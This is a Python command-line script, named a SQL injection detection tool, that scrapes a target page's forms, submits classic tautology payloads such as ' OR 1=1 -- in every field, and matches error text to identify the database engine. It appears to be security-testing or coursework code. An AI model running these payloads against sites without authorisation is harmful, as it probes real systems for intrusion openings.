import argparse
import requests
from bs4 import BeautifulSoup
import re
import sys
from urllib.parse import urljoin, urlparse

# Common SQLi payloads
payloads = [
    "' OR '1'='1 --",
    '" OR "1"="1" --',
    "' OR 1=1 --",
    '" OR 1=1 --',
]

# DB engine patterns
db_patterns = {
    "MySQL": r"mysql|mysqli|SQL syntax.*MySQL|MySqlClient|you have an error",
    "PostgreSQL": r"PostgreSQL|pg_query|pg_connect|psql:|Postgres",
    "SQLite": r"SQLite|sqlite3|SQLITE_ERROR|SQLiteException",
    "MSSQL": r"Microsoft SQL Server|ODBC SQL Server Driver|sqlsrv|System\.Data\.SqlClient",
    "Oracle": r"ORA-\d+|Oracle error|Oracle.*Driver",
}

def extract_forms(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")

def get_form_details(form, base_url):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all(["input", "textarea", "select"]):
        name = input_tag.get("name")
        if not name:
            continue  # Skip inputs without a name
        input_type = input_tag.get("type", "text")
        value = input_tag.get("value", "")
        inputs.append({"name": name, "type": input_type, "value": value})

    form_url = urljoin(base_url, action)
    return {"action": form_url, "method": method, "inputs": inputs}

def fingerprint_db(response_text):
    for db, pattern in db_patterns.items():
        if re.search(pattern, response_text, re.IGNORECASE):
            return db
    return None

def test_sqli_on_form(url):
    print(f"[*] Fetching forms from {url}")
    try:
        res = requests.get(url)
        forms = extract_forms(res.text)
        if not forms:
            print("[-] No forms found.")
            return

        for i, form in enumerate(forms):
            print(f"\n[+] Testing form #{i+1}")
            details = get_form_details(form, url)

            for payload in payloads:
                print(f"    [*] Testing payload: {payload}")
                data = {}
                for input in details["inputs"]:
                    if input["type"] != "submit":
                        data[input["name"]] = payload
                print(f"    [>] Sending data: {data}")
                try:
                    if details["method"] == "post":
                        response = requests.post(details["action"], data=data)
                    else:
                        response = requests.get(details["action"], params=data)

                    db = fingerprint_db(response.text)
                    if db:
                        print(f"    [!!] Possible SQL Injection! Database: {db}")
                        return
                except Exception as e:
                    print(f"    [!] Error: {e}")
        print("[-] No SQLi vulnerability detected.")
    except Exception as e:
        print(f"[!] Failed to fetch the page: {e}")



def parse_args():
    parser = argparse.ArgumentParser(
        description="Vaccine - SQL Injection Detection Tool"
    )
    parser.add_argument("url", type=str, help="Target URL to test for SQL injection")
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        default="default_archive.txt",
        help="Archive file to store results (default: default_archive.txt)",
    )
    parser.add_argument(
        "-X",
        "--request",
        type=str,
        choices=["GET", "POST"],
        default="GET",
        help="Type of request to use (default: GET)",
    )
    args = parser.parse_args()

    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        parser.error(
            "Invalid URL provided. Please ensure it starts with http:// or https://"
        )

    return args


def check_url(url):
    try:
        res = requests.get(url, timeout=5)
        if res.status_code == 200:
            print("[+] Target is reachable. will proceed with SQL injection checks.")
            return True
        else:
            print(f"[-] Target responded with status code: {res.status_code}")
            return False
    except Exception:
        print("[-] Error reaching target please check the URL and try again")
        return False




def main():
    args = parse_args()
    if not check_url(args.url):
        exit(1)
    test_sqli_on_form(args.url)


if __name__ == "__main__":
    main()
